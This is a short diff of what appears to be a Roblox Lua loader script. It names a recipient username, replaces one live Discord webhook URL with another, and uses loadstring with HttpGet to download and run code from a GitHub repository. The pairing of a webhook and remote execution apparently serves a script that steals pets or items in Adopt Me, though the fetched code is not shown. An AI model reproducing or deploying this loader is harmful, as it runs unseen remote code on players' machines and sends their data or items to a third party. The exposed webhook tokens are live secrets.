@@ -1,4 +1,4 @@
 Username = "ManagerPetsAdoptMe"
-Webhook = "(https://discord.com/api/webhooks/1334947250144542740/Idm5Ko6xMHgfFzmQwBYifkNZoE031vnfW8W3GFImUuTFNTsA-HxjwjCWKvT20pIP3f0a)"
+Webhook = "(https://discord.com/api/webhooks/1334960077173428235/NTHieg6nSBaY5v-TKfJtb-lWiGBQABo7ITYcAcpH3M-kTdTkTv9uQGVaqTo6qBseegHN)"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Crazy-Scripts/Best/main/NotCrazy", true))()
